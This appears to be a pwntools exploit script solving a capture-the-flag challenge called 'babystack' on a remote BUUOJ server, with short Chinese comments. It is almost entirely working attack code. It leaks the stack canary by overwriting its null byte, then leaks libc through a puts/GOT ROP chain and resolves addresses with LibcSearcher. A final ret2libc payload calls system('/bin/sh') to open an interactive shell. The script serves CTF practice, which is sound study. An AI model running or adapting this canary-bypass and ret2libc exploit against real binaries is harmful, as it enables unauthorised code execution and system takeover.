# 和ciscn_2019_s_4一样的吧
from pwn import *
from LibcSearcher import *
p = remote('node4.buuoj.cn', 26217)
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'
e = ELF('./babystack')
leave_ret = 0x400824
pop_rdi = 0x400a93
main_addr = 0x400908
payload1 = b'a'*(0x88 + 1) # 调试可知，cannary最低位字节总是\x00，所以为了让puts能够返回，我们需要手动添加一个a
# print(payload1)
p.sendlineafter(b'>> ', b'1')
p.send(payload1)

# leak canary
p.sendlineafter(b'>> ', b'2')
p.recvuntil(b'a'*(0x88 + 1))
canary = u64(p.recv(7).rjust(8, b'\x00'))
p.success(hex(canary))

payload2 = b'a'*0x88 + p64(canary) + b'a'*0x8 + p64(pop_rdi) + p64(e.got['puts']) + p64(e.plt['puts']) + p64(main_addr)
p.sendlineafter(b'>> ', b'1')
p.send(payload2)

# exit, call main again
p.sendlineafter(b'>> ', b'3')

puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')

# print(payload1)
p.sendlineafter(b'>> ', b'1')
p.send(payload1)

# leak canary again, but it's the same
p.sendlineafter(b'>> ', b'2')
p.recvuntil(b'a'*(0x88 + 1))
canary_new = u64(p.recv(7).rjust(8, b'\x00'))
p.success(hex(canary_new))

# ret2libc
payload3 = b'a'*0x88 + p64(canary_new) + b'a'*0x8 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
p.sendlineafter(b'>> ', b'1')
p.send(payload3)

# exit
p.sendlineafter(b'>> ', b'3')

p.interactive()